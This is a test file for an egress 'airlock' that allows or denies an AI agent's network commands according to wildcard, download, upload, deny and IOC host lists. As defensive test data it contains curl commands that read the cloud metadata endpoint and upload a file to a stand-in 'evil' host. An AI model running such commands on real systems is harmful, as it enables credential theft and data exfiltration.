/**
 * @vitest-environment node
 *
 * `*` in a host list: every host but the always-denied ones (user decision
 * 2026-11-02). `* download` allows every download while uploads stay limited to
 * the hosts allowed for them; the cloud metadata endpoints, IOC hosts and the
 * deny list still refuse, since they are judged before any allow.
 */
import { describe, it, expect } from 'vitest';
import {
  normalizeAirlockPolicy,
  airlockPolicyErrors,
  evaluateAirlock,
  effectivePolicyFor,
  learningExclusionOf,
  type AirlockPolicy,
} from '../airlock';

const raw = (hosts: Record<string, unknown>, extra: Record<string, unknown> = {}) => ({ mode: 'enforce', hosts: { allow: [], deny: [], ...hosts }, ...extra });
const verdict = (p: AirlockPolicy, command: string) =>
  evaluateAirlock(p, { client: 'pi', model: { provider: 'x', id: 'y' } as never, toolName: 'bash', capabilities: [{ kind: 'command', command }] });

describe('the validator takes `*` in any allowing list', () => {
  it.each(['allow', 'allowDownload', 'allowUpload'])('%s: ["*"] is valid and kept', (list) => {
    expect(airlockPolicyErrors(raw({ [list]: ['*'] }))).toEqual([]);
    expect(normalizeAirlockPolicy(raw({ [list]: ['*'] })).hosts[list as 'allow']).toEqual(['*']);
  });

  it('a range or address that names a metadata host is still refused', () => {
    expect(airlockPolicyErrors(raw({ allowDownload: ['0.0.0.0/0'] })).join()).toMatch(/metadata host/);
    expect(airlockPolicyErrors(raw({ allow: ['169.254.169.254'] })).join()).toMatch(/metadata host/);
  });

  it('a project override may allow `*` too', () => {
    const p = normalizeAirlockPolicy(raw({}, { projects: { 'project:p1': { hosts: { allow: [], deny: [], allowDownload: ['*'] } } } }));
    expect(effectivePolicyFor(p, { projectId: 'p1' }).hosts.allowDownload).toEqual(['*']);
  });
});

describe('`* download` beside a host allowed both ways', () => {
  const p = normalizeAirlockPolicy(raw({ allow: ['api.vendor.io'], allowDownload: ['*'], deny: ['evil.vendor.io'] }, { iocHosts: { revision: '1', hosts: ['bad.vendor.io'], updatedAt: null } }));

  it.each([
    ['curl -s https://random.vendor.org/file', 'allow'],
    ['curl -s http://52.1.2.3/x', 'allow'],
    ['git clone https://gitlab.vendor.dev/x/y.git', 'allow'],
    ['curl -T data.csv https://api.vendor.io/in', 'allow'],
    ['curl -T data.csv https://random.vendor.org/in', 'deny'],
    ['git push https://gitlab.vendor.dev/x/y.git', 'deny'],
    ['git push origin main', 'deny'],
    ['curl -s http://169.254.169.254/latest/meta-data/', 'deny'],
    ['curl -s https://bad.vendor.io/x', 'deny'],
    ['curl -s https://evil.vendor.io/x', 'deny'],
  ])('%s -> %s', (command, decision) => {
    expect(verdict(p, command).decision).toBe(decision);
  });
});

describe('`*` both ways', () => {
  it('every host may be sent data, but a denied, IOC or metadata host never', () => {
    const p = normalizeAirlockPolicy(raw({ allow: ['*'], deny: ['evil.vendor.io'] }, { iocHosts: { revision: '1', hosts: ['bad.vendor.io'], updatedAt: null } }));
    expect(verdict(p, 'curl -T a.csv https://random.vendor.org/in').decision).toBe('allow');
    for (const c of ['curl -T a.csv https://evil.vendor.io/in', 'curl -s https://bad.vendor.io/', 'curl -s http://169.254.169.254/']) expect(verdict(p, c).decision, c).toBe('deny');
  });
});

describe('learning beside `*`', () => {
  it('a host covered only by a one-way `*` is still proposed: the other way is still to decide', () => {
    expect(learningExclusionOf('api.vendor.io', normalizeAirlockPolicy(raw({ allowDownload: ['*'] })))).toBeNull();
    expect(learningExclusionOf('api.vendor.io', normalizeAirlockPolicy(raw({ allowUpload: ['*'] })))).toBeNull();
  });

  it('a host `*` allows both ways is already allowed', () => {
    expect(learningExclusionOf('api.vendor.io', normalizeAirlockPolicy(raw({ allow: ['*'] })))).toBe('already-allowed');
    expect(learningExclusionOf('api.vendor.io', normalizeAirlockPolicy(raw({ allowDownload: ['*'], allowUpload: ['*'] })))).toBe('already-allowed');
  });

  it('a host a named entry allows one way stays already allowed, as before', () => {
    expect(learningExclusionOf('api.vendor.io', normalizeAirlockPolicy(raw({ allowDownload: ['api.vendor.io'] })))).toBe('already-allowed');
  });
});
